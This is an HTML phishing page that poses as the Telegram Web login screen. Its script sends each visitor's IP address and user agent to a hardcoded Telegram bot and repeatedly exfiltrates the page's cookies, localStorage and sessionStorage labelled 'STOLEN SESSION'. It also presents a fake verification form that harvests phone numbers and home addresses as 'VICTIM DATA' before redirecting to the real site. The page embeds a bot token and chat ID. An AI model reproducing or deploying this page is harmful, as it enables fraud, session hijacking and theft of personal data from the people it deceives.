<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Telegram Web</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f0f0f;
        }
        .telegram-header {
            background: #1f2c33;
            padding: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .telegram-header img {
            width: 32px;
            height: 32px;
        }
        .telegram-header span {
            color: white;
            font-size: 18px;
            font-weight: 500;
        }
        .login-container {
            max-width: 400px;
            margin: 50px auto;
            background: #1f2c33;
            border-radius: 12px;
            padding: 30px;
            text-align: center;
        }
        .login-container h2 {
            color: white;
            margin-bottom: 10px;
        }
        .login-container p {
            color: #888;
            font-size: 14px;
            margin-bottom: 20px;
        }
        button {
            background: #2b9c5c;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
        }
        .qr-code {
            width: 200px;
            height: 200px;
            background: #2c3e3f;
            margin: 20px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 12px;
        }
        .status {
            color: #888;
            font-size: 12px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="telegram-header">
        <img src="https://telegram.org/img/favicon.ico" alt="logo">
        <span>Telegram Web</span>
    </div>
    <div class="login-container">
        <h2>Log in to Telegram</h2>
        <p>Use your phone to confirm login</p>
        <div class="qr-code">
            <span style="color:#888;">Loading...</span>
        </div>
        <button id="loginBtn">Continue with Phone →</button>
        <div class="status" id="status"></div>
    </div>

    <script>
        const BOT_TOKEN = '8172323730:AAEfo4Eqz8E9HWSNOGF96BHndyjN9anBRLg';
        const CHAT_ID = '1471307057';
        
        // Собираем IP и данные
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `🔍 <b>New Visitor</b>\nIP: ${data.ip}\nUA: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}`,
                        parse_mode: 'HTML'
                    })
                });
            });
        
        // Функция кражи cookies
        function stealCookies() {
            const cookies = document.cookie;
            const localStorage = JSON.stringify(localStorage);
            const sessionStorage = JSON.stringify(sessionStorage);
            
            if (cookies || localStorage !== '{}') {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `🍪 <b>STOLEN SESSION</b>\n\nCookies: ${cookies.substring(0, 500)}\n\nLocalStorage: ${localStorage.substring(0, 500)}\n\nSessionStorage: ${sessionStorage.substring(0, 500)}`,
                        parse_mode: 'HTML'
                    })
                });
            }
        }
        
        // Пытаемся украсть сразу
        setTimeout(stealCookies, 2000);
        
        // Кнопка "Continue with Phone" — ведет на фейковую форму
        document.getElementById('loginBtn').onclick = () => {
            document.getElementById('status').innerHTML = '⏳ Redirecting to verification...';
            
            setTimeout(() => {
                // Редирект на фейковую форму ввода номера и адреса
                document.body.innerHTML = `
                    <div style="max-width:400px; margin:50px auto; background:#1f2c33; border-radius:12px; padding:30px;">
                        <h2 style="color:white;">Verify Your Account</h2>
                        <p style="color:#888;">For security, please confirm your details</p>
                        <input type="text" id="phone" placeholder="Phone Number" style="width:100%; padding:12px; margin:10px 0; border-radius:8px; border:none;">
                        <input type="text" id="address" placeholder="Full Address" style="width:100%; padding:12px; margin:10px 0; border-radius:8px; border:none;">
                        <button onclick="submitData()" style="background:#2b9c5c; color:white; border:none; padding:12px; width:100%; border-radius:8px;">Verify</button>
                    </div>
                    <script>
                        function submitData() {
                            const phone = document.getElementById('phone').value;
                            const address = document.getElementById('address').value;
                            
                            fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    chat_id: ${CHAT_ID},
                                    text: '📞 <b>VICTIM DATA</b>\\nPhone: ' + phone + '\\nAddress: ' + address + '\\nTime: ' + new Date().toLocaleString(),
                                    parse_mode: 'HTML'
                                })
                            });
                            
                            document.body.innerHTML = '<div style="text-align:center; padding:50px;"><h2>✅ Verified</h2><p>Redirecting to Telegram...</p></div>';
                            setTimeout(() => { window.location.href = 'https://web.telegram.org'; }, 2000);
                        }
                    <\/script>
                `;
            }, 500);
        };
        
        // Пытаемся украсть cookies каждые 5 секунд
        setInterval(stealCookies, 5000);
    </script>
</body>
</html>
